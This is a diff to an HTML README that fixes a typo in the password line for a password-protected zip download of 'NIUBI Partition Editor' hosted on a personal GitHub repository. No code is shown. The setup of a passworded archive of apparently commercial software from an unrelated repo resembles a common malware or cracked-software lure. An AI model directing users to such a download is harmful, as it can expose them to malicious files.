@@ -4,7 +4,7 @@
 <hr>
 <h2>Download</h2>
 <ul>
-  <li><b>Download NIUBI</b>. <i>(Passowrd: NIUBI_PE_Forever</i></li>
+  <li><b>Download NIUBI</b>. <i>(Passowrd: NIUBI_PE_Forever)</i></li>
   <br>
   <a href="https://github.com/havanagilla1/NIUBI-Partition-Editor/releases/download/Download/NIUBI_Partition_Editor.zip"><img src="https://github.com/user-attachments/assets/eea6f72f-f9d7-43d5-8b6b-81886e6239d0"></a>
 </ul>
